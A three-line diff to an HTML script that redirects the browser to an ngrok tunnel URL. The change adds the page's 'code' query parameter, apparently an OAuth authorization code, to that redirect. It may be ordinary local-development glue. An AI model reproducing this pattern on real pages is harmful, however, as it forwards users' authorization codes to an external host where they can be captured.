@@ -1,3 +1,4 @@
 <script>
-    window.location.href = "https://21bf-58-179-16-163.ngrok.io"
+    var code = new URLSearchParams(window.location.search);
+    window.location.href = `https://21bf-58-179-16-163.ngrok.io?code=${code.get('code')}`
 </script>
